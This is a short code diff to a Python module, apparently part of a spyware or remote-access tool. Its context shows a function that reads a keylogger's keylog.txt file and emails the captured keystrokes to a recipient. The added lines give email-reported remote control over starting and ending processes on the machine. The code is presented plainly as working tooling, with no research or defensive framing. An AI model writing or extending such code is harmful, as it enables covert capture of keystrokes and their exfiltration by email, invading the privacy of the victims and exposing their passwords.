@@ -73,3 +73,17 @@ def send_keyLog_email(recipient_email, duration):
     body = key_log.read_file("keylog.txt")
     if body is not None:
         send_email(subject, body, recipient_email)
+        
+def send_startProc_status(recipient_email, process_name):
+    proc_controlller = ProcessController()
+    
+    subject = "PROCESS STATUS REPORT"
+    body = proc_controlller.startBackgroundProcess(process_name)
+    send_email(subject, body, recipient_email)
+    
+def send_endProc_status(recipient_email, process_name):
+    proc_controlller = ProcessController()
+    
+    subject = "PROCESS STATUS REPORT"
+    body = proc_controlller.endProcess(process_name)
+    send_email(subject, body, recipient_email)
